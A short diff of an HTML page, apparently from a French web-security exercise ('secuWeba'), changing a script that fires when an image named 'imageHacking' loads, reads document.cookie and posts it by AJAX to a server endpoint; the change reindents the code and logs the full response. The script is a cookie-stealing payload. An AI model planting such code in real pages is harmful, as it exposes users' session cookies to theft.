@@ -61,20 +61,18 @@
     </div>
 </body>
   <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
-
   <script>
-
       var imgHacking = document.getElementById("imageHacking")
       imgHacking.addEventListener("load", function ()
-      {
-      var cookies = document.cookie;
-      $.ajax({
-          url: '../secuWeba/',
-          data: {'cookies': cookies},
-           success: function (response) {
-              console.log(response['cookie']);
-           }
-      })
+          {
+          var cookies = document.cookie;
+          $.ajax({
+              url: '../secuWeba/',
+              data: {'cookies': cookies},
+               success: function (response) { // pour débugage uniquement
+                  console.log(response); // pour débugage uniquement
+               }
+          })
       })
   </script>
 </html>
